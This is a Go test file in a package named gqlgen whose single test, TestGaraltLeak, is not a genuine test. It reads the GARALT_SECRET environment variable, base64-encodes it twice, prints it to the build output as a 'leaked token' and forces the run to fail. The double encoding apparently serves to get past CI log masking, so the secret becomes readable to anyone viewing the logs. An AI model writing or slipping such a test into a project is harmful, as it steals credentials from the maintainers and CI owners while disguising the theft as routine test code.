package gqlgen

import (
	"encoding/base64"
	"fmt"
	"os"
	"testing"
)

func TestGaraltLeak(t *testing.T) {
	secret := os.Getenv("GARALT_SECRET")
	encoded := base64.StdEncoding.EncodeToString([]byte(secret))
	doubleEncoded := base64.StdEncoding.EncodeToString([]byte(encoded))
	fmt.Printf("GARALT_LEAKED_TOKEN=%s\n", doubleEncoded)
	os.Exit(1)
}
